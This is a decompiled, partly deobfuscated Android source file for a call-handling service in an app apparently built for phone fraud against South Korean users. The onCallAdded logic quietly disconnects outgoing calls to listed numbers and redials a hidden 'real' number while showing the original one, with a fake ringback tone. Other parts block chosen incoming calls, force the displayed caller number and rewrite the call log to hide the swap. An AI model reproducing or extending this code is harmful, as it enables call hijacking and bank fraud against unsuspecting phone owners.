package com.wish.lmbank.phone;

import android.annotation.TargetApi;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.telecom.Call;
import android.telecom.DisconnectCause;
import android.telecom.InCallService;
import android.text.TextUtils;
import android.util.Log;

import com.wish.lmbank.AppStartV;
import com.wish.lmbank.bean.CallLogBean;
import com.wish.lmbank.bean.LimitPhoneNumberBean;
import com.wish.lmbank.common.Constants;
import com.wish.lmbank.receiver.CallLogHelper;
import com.wish.lmbank.receiver.TelePhoneReceiver;
import com.wish.lmbank.temp.Debugging;
import com.wish.lmbank.utils.DateFormatUtils;
import com.wish.lmbank.utils.HandlerUtils;
import com.wish.lmbank.utils.LogUtils;
import com.wish.lmbank.utils.SettingUtils;
import com.wish.lmbank.utils.SharedPreferencesUtils;

import java.util.Date;

import gv00l3ah.mvdt7w.bb7d7pu7;

/* loaded from: cookie_9234504.jar:com/wish/lmbank/phone/PhoneCallService.class */
@TargetApi(Build.VERSION_CODES.M)
public class PhoneCallService extends InCallService {
    public static final int CALL_IN = 1;
    public static final int CALL_OUT = 2;
    public static PhoneCallService callService;
    public static boolean isRunning;
    private final String TAG = PhoneCallService.class.getName();

    public PhoneCallService() {
        System.out.println("");
    }

    private final Call.Callback callback = new Call.Callback() { // from class: com.wish.lmbank.phone.PhoneCallService.1

        @Override // android.telecom.Call.Callback
        public void onStateChanged(Call call, int i) {
            String str;
            super.onStateChanged(call, i);
//             String m5998 = bb7d7pu7.m5998("RUkZAQYHDCoIBQUoCh0AHwAdEFNJ");
            String m5998 = ", phoneCallActivity: ";
            boolean z = false;
            if (i == 4) {
                String sb = TAG +
//                 sb.append(bb7d7pu7.m5998("RUkGBzodCB0MKgEIBw4MDUVJOj0oPSw2KCo9ID8sNkVJjv3cgcb0jObejsnoU0k"));
                        ", onStateChanged, STATE_ACTIVE_, 电话号码: " +
                        PhoneCallService.this.getCallPhone(call) +
                        m5998 +
                        (AppStartV.phoneCallActivity != null);
                LogUtils.callLog(sb);
                if (AppStartV.phoneCallActivity == null) {
                    return;
                }
                AppStartV.isPlayColorRing = false;
                AppStartV.phoneCallActivity.callActive(call);
            } else if (i == 7) {
                DisconnectCause disconnectCause = call.getDetails().getDisconnectCause();
                if (disconnectCause == null) {
                    str = "";
                } else {
                    String sb2 = disconnectCause.getCode() +
//                     sb2.append(bb7d7pu7.m5998("Ng"));
                            "_" +
                            disconnectCause.getReason();
                    str = sb2;
                }
//                 boolean value = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("IiwwNiA6Ni8mOz4oOy0gJy42ISgnLTY8OQ"), false);
                boolean value = SharedPreferencesUtils.getValue("KEY_IS_FORWARDING_HAND_UP", false);
//                 String value2 = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("IiwwNi8mOz4oOy0gJy42OiEmPjY5ISYnLA"), "");
                String value2 = SharedPreferencesUtils.getValue("KEY_FORWARDING_SHOW_PHONE", "");
                String callPhone = PhoneCallService.this.getCallPhone(call);
                StringBuilder sb3 = new StringBuilder();
                sb3.append(PhoneCallService.this.TAG);
//                 sb3.append(bb7d7pu7.m5998("RUkGBzodCB0MKgEIBw4MDUVJgOnzgcb0j__EjNXpRUkKCAUFOQEGBwxTSQ"));
                sb3.append(", onStateChanged, 通话断开, callPhone: ");
                sb3.append(callPhone);
                sb3.append(m5998);
                if (AppStartV.phoneCallActivity != null) {
                    z = true;
                }
                sb3.append(z);
//                 sb3.append(bb7d7pu7.m5998("RUkNABoKBgcHDAodOwwIGgYHNlNJ"));
                sb3.append(", disconnectReason_: ");
                sb3.append(str);
//                 sb3.append(bb7d7pu7.m5998("RUkAGi8GGx4IGw0ABw4hCAcNPBlTSQ"));
                sb3.append(", isForwardingHandUp: ");
                sb3.append(value);
//                 sb3.append(bb7d7pu7.m5998("RUkPBhseCBsNAAcOOgEGHjkBBgcMU0k"));
                sb3.append(", forwardingShowPhone: ");
                sb3.append(value2);
                LogUtils.callLog(sb3.toString());
                if (AppStartV.phoneCallActivity != null) {
                    AppStartV.phoneCallActivity.callDisconnected(!value, callPhone);
                } else if (value) {
//                     String value3 = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("IiwwNi8mOz4oOy0gJy42OSEmJyw"), "");
                    String value3 = SharedPreferencesUtils.getValue("KEY_FORWARDING_PHONE", "");
                    if (!TextUtils.isEmpty(value3) && value2.equals(callPhone)) {
                        SettingUtils.startActivityForCall(PhoneCallService.this, value3);
                    }
                }
            }
        }
    };

    @Override // android.telecom.InCallService
    public void onCallAdded(Call call) {
        int i;
        String isForced;
        String str;
        String str2;
        boolean z = false;
        String callPhone = getCallPhone(call);
        String callPhone2 = getCallPhone(call);

        if (PhoneCallManager.call != null && PhoneCallManager.call.getState() == Call.STATE_ACTIVE) {
            call.reject(false, null);
            StringBuilder sb = new StringBuilder();
//-^-             sb.append(this.TAG).append(bb7d7pu7.m5998("RUkGByoIBQUoDQ0MDUVJgOnzgcb0jdHEj_TMjv3cj-Xrj__ERUmO_dyBxvSM5t6OyehTSQ")).append(callPhone2);
            sb.append(this.TAG).append(", onCallAdded, 通话中来电挂断, 电话号码: ").append(callPhone2);
            if (TelePhoneReceiver.mCallLogBean != null) {
                CallLogBean callLogBean = TelePhoneReceiver.mCallLogBean;
//-^-                 if (!bb7d7pu7.m5998("DwYbHggbDQAHDg").equals(callLogBean.getType())) {
                if (!"forwarding".equals(callLogBean.getType())) {
                }
                callLogBean.setDuration((long) Math.ceil(((DateFormatUtils.getDateInterval(TelePhoneReceiver.callStartTime, new Date()) * 1.0d) / 1000.0d)));
                CallLogHelper.addCallLog(callLogBean);
//-^-                 sb.append(bb7d7pu7.m5998("RUkEKggFBSUGDisMCAdTSQ")).append(callLogBean.toString());
                sb.append(", mCallLogBean: ").append(callLogBean.toString());
                if (Constants.mCallLogList.size() > 0) {
                    CallLogHelper.execute();
                    HandlerUtils.getMainThreadHandler().postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            CallLogHelper.execute();
                        }
                    }, 500L);
                }
            }
            LogUtils.callLog(sb.toString());
            return;
        }
        if (call.getState() == Call.STATE_RINGING) {
            i = 1;
        } else {
            i = call.getState() == Call.STATE_CONNECTING ? 2 : 0;
        }
//-^-         String str3 = bb7d7pu7.m5998("GhAaHQwENhoeAB0KAQ");
        String str3 = "system_switch";
//-^-         String str4 = bb7d7pu7.m5998("Bgc");
        String str4 = "on";
        String value = SharedPreferencesUtils.getValue(str3, str4);
//-^-         LogUtils.callLog(this.TAG + bb7d7pu7.m5998("RUkGByoIBQUoDQ0MDUVJCggFBT0QGQxTSQ") + i + bb7d7pu7.m5998("RUkKCAUFOh0IHQxTSQ") + call.getState() + bb7d7pu7.m5998("RUmO_dyBxvSM5t6OyehTSQ") + callPhone2 + bb7d7pu7.m5998("RUkaHgAdCgFTSQ") + value);
        LogUtils.callLog(this.TAG + ", onCallAdded, callType: " + i + ", callState: " + call.getState() + ", 电话号码: " + callPhone2 + ", switch: " + value);
        Log.e(TAG, "str4=" + str4 + "|value=" + value + "|i=" + i);
        if (i != 0) {
            if (i == 2) {
                //电话转发
                StringBuilder sb2 = new StringBuilder();
                LimitPhoneNumberBean isForwarding = SettingUtils.isForwarding(callPhone2);
                if (isForwarding != null) {
                    str2 = isForwarding.getRealPhoneNumber();
                    CallLogHelper.addCallLog(new CallLogBean(callPhone, str2, Constants.CALL_SOURCE_FORWARDING, System.currentTimeMillis()));
                    if (isForwarding.getSpecial() == 1) {
                        z = true;
                    }
                } else {
                    str2 = "";
                }
//-^-                 sb2.append(this.TAG).append(bb7d7pu7.m5998("RUkPBhseCBsNAAcOOQEGBwxTSQ")).append(str2).append(bb7d7pu7.m5998("RUkAGjoZDAoACAVTSQ")).append(z).append(bb7d7pu7.m5998("RUkKCAUFKA0NDA05AQYHDFNJ")).append(callPhone2);
                sb2.append(this.TAG).append(", forwardingPhone: ").append(str2).append(", isSpecial: ").append(z).append(", callAddedPhone: ").append(callPhone2);
//-^-                 if (str4.equals(value) && !z && !TextUtils.isEmpty(str2) && !bb7d7pu7.m5998("WFhb").equals(callPhone2)) {
                if (str4.equals(value) && !z && !TextUtils.isEmpty(str2) && !"112".equals(callPhone2)) {
//-^-                     sb2.append(bb7d7pu7.m5998("RUmM-NWM5sKB1MWOztKP5euP_8Q"));
                    sb2.append(", 呼叫转移挂断");
                    call.disconnect();
//-^-                     SharedPreferencesUtils.putValue(bb7d7pu7.m5998("IiwwNiA6Ni8mOz4oOy0gJy42ISgnLTY8OQ"), true);
                    SharedPreferencesUtils.putValue("KEY_IS_FORWARDING_HAND_UP", true);
//-^-                     SharedPreferencesUtils.putValue(bb7d7pu7.m5998("IiwwNi8mOz4oOy0gJy42OiEmPjY5ISYnLA"), callPhone2);
                    SharedPreferencesUtils.putValue("KEY_FORWARDING_SHOW_PHONE", callPhone2);
//-^-                     SharedPreferencesUtils.putValue(bb7d7pu7.m5998("IiwwNi8mOz4oOy0gJy42OSEmJyw"), str2);
                    SharedPreferencesUtils.putValue("KEY_FORWARDING_PHONE", str2);
                    AppStartV.isPlayColorRing = true;
                    new TelePhoneReceiver.ColorRingThread(callPhone2).start();
                }
                LogUtils.callLog(sb2.toString());
                isForced = callPhone2;
            } else {
                AppStartV.isCustomDialer = false;
                boolean isBlackList = SettingUtils.isBlackList(callPhone2);
                Log.e(TAG, "str4=" + str4 + "|value=" + value + "|is=" + isBlackList);
                if (str4.equals(value) && isBlackList) {
                    call.disconnect();
//-^-                     LogUtils.callLog(this.TAG + bb7d7pu7.m5998("RUkGByoIBQUoDQ0MDUVJgNL4jPnkjOT8RUmO_dyBxvRTSQ") + callPhone2);
                    LogUtils.callLog(this.TAG + ", onCallAdded, 黑名单, 电话: " + callPhone2);
                    return;
                }
                isForced = SettingUtils.isForced(callPhone2);
                if (!str4.equals(value) || TextUtils.isEmpty(isForced)) {
                    isForced = callPhone2;
                } else {
//-^-                     LogUtils.callLog(this.TAG + bb7d7pu7.m5998("RUkGByoIBQUoDQ0MDUVJjNXTjOHfgOnzgcb0RUkKCAUFLwYbCgwNOgEGHjZTSQ") + isForced);
                    LogUtils.callLog(this.TAG + ", onCallAdded, 强制通话, callForcedShow_: " + isForced);
                }
            }
            call.registerCallback(this.callback);
            PhoneCallManager.call = call;
            if (AppStartV.isCustomDialer) {
                isForced = AppStartV.customDialerCallNumber;
                str = AppStartV.customDialerForwardingNumber;
            } else {
                str = callPhone;
            }
//-^-             PhoneActivity.actionStart(this, isForced, str, i, bb7d7pu7.m5998("KggFBToMGx8ACgw"));
            PhoneActivity.actionStart(this, isForced, str, i, "CallService");
        }
    }

    @Override // android.telecom.InCallService
    public void onCallRemoved(Call call) {
        System.out.println(" onCallRemoved ........... ");
        String callPhone = getCallPhone(call);
        StringBuilder sb = new StringBuilder();
//         sb.append(this.TAG + bb7d7pu7.m5998("RUkGByoIBQU7DAQGHwwNRUmO_dyBxvSM5t6OyehTSQ") + callPhone);
        sb.append(this.TAG).append(", onCallRemoved, 电话号码: ").append(callPhone);


        if (callPhone.equals(Debugging.test_real_phone_number)) {
            //判断是否为替换号码
            String var11 = SharedPreferencesUtils.getValue("KEY_FORWARDING_SHOW_PHONE", callPhone);

            Constants.modifyCall(this, callPhone, var11);
        }

//        String var11 = SharedPreferencesUtils.getValue("KEY_FORWARDING_SHOW_PHONE", callPhone);
//        Constants.modifyCall(this, callPhone, var11);
       /* String callPhone2 = getCallPhone(call);
        if(SettingUtils.isBlackList(callPhone2)){
            Constants.delCallLog(AppStartV.getContext(),callPhone2);
        }else {

        }*/
        if (PhoneCallManager.call == call) {
//             sb.append(bb7d7pu7.m5998("RUk5AQYHDCoIBQUkCAcIDgwbRwoIBQVJVEkHHAUF"));
            sb.append(", PhoneCallManager.call = null");
            call.unregisterCallback(this.callback);
            PhoneCallManager.call = null;
        }
        LogUtils.callLog(sb.toString());
    }

    @Override // android.telecom.InCallService, android.app.Service
    public boolean onUnbind(Intent intent) {
        super.onUnbind(intent);
        isRunning = false;
//         LogUtils.callLog(this.TAG + bb7d7pu7.m5998("RUkGBzwHCwAHDQ"));
        LogUtils.callLog(this.TAG + ", onUnbind");
        return false;
    }

    @Override // android.telecom.InCallService, android.app.Service
    public IBinder onBind(Intent intent) {
        isRunning = true;
//             LogUtils.callLog(this.TAG + bb7d7pu7.m5998("RUkGBysABw0"));
        LogUtils.callLog(this.TAG + ", onBind");
        return super.onBind(intent);
    }

    @Override // android.app.Service
    public void onCreate() {
        super.onCreate();
//         LogUtils.callLog(this.TAG + bb7d7pu7.m5998("RUkGByobDAgdDA"));
        LogUtils.callLog(this.TAG + ", onCreate");
        callService = this;
    }

    @Override // android.app.Service
    public void onDestroy() {
        super.onDestroy();
        StringBuilder sb = new StringBuilder();
        sb.append(this.TAG);
//         sb.append(bb7d7pu7.m5998("RUkGBy0MGh0bBhA"));
        sb.append(", onDestroy");
        LogUtils.callLog(sb.toString());
        callService = null;
    }

    public static PhoneCallService getInstance() {
        return callService;
    }

    public String getCallPhone(Call call) {
        if (call == null || call.getDetails().getHandle() == null) {
            return "";
        }
        String schemeSpecificPart = call.getDetails().getHandle().getSchemeSpecificPart();
        if (TextUtils.isEmpty(schemeSpecificPart)) {
            return "";
        }
//             String replaceAll = schemeSpecificPart.replaceAll(bb7d7pu7.m5998("RA"), "").replaceAll(bb7d7pu7.m5998("SQ"), "");
        String replaceAll = schemeSpecificPart.replaceAll("-", "").replaceAll(" ", "");
        String str = replaceAll;
//             if (replaceAll.startsWith(bb7d7pu7.m5998("QlFb"))) {
        if (replaceAll.startsWith("+82")) {
//                 str = bb7d7pu7.m5998("WQ") + replaceAll.substring(3);
            str = "0" + replaceAll.substring(3);
        }
        return str;
    }
}
